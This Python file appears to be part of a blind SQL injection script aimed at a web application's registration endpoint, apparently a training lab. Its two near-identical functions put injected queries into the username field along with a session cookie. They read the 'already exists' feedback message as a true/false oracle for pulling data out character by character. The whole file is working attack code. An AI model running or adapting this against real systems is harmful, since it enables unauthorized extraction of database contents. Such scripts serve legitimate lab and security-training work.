import requests
import json

from res import URL


def check(cookie="", query="") -> bool:
    """
    This checks the validity of the possible candidate names.

    :param cookie: Session cookie required by the header
    :param query: Query to inject
    :return: Boolean value to denote the injected value's validity
    """

    headers = {
        'Cookie': cookie,
    }

    data = {
        'username_reg': query,
        'email_reg': 'paul@gmail.com',
        'password_reg': 'paul123',
        'confirm_password_reg': 'paul123',
    }

    r = requests.put(URL, headers=headers, data=data)

    try:
        response = json.loads(r.text)

    except:
        print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
        return False

    if (
            "already exists please try to register with a different username"
            not in response['feedback']
    ):
        return False
    else:
        return True


def inject(cookie="", query="") -> bool:
    """
    This checks if the alphabet added to the sequence is valid.

    :param cookie: Session cookie required by the header
    :param query: Query to inject
    :return: Boolean value to denote the injected value's validity
    """
    headers = {
        'Cookie': cookie,
    }
    print(query)
    data = {
        'username_reg': query,
        'email_reg': 'paul@gmail.com',
        'password_reg': 'paul123',
        'confirm_password_reg': 'paul123',
    }

    r = requests.put(URL, headers=headers, data=data)

    try:
        response = json.loads(r.text)

    except:
        print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
        return False

    if (
            "already exists please try to register with a different username"
            not in response['feedback']
    ):
        return False
    else:
        return True
